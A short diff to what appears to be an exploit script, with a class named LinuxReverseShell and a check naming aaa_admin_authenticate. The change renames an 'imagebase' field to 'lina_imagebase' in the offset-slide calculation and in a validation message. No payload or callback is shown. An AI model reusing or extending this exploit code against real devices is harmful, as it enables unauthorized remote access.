@@ -122,7 +122,7 @@ class LinuxReverseShell(object):
             use_slide=True):
         slide = 0x0
         if use_slide:
-            slide = self._target["imagebase"]
+            slide = self._target["lina_imagebase"]
         if len(pattern) == 4:
             fmt = "<I"
         elif len(pattern) == 8:
@@ -273,8 +273,8 @@ def main():
         sys.exit(1)
     c["target"]   = targets[index]
 
-    # we need a valid imagebase so the offset in the ELF is right
-    if c["target"]["imagebase"] == 0:
+    # we need a valid lina_imagebase so the offset in the ELF is right
+    if c["target"]["lina_imagebase"] == 0:
         logmsg("Error: Looks like aaa_admin_authenticate will be wrong")
         sys.exit(1)
     # relative offset in memory is actual offset in ELF
